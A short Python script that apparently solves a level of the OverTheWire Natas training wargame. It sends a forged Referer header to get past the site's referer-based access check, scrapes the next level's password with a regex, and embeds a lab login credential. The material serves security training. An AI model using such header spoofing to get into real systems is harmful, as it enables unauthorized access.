#!/usr/bin/env python

import requests
import re

username='natas4'
password='Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

referer_url = {"Referer": "http://natas5.natas.labs.overthewire.org/"}
url = 'http://%s.natas.labs.overthewire.org/' %username
response = requests.get(url, auth = (username, password), headers=referer_url)		#Passing the referer URL as a paramenter of header
content = response.text

# print content

print re.findall('The password for natas5 is (.*)', content)[0]
#On the main it says authorized users should only come from "http://natas5.natas.labs.overthewire.org/". Suggesting this URL should be in the referer part of the header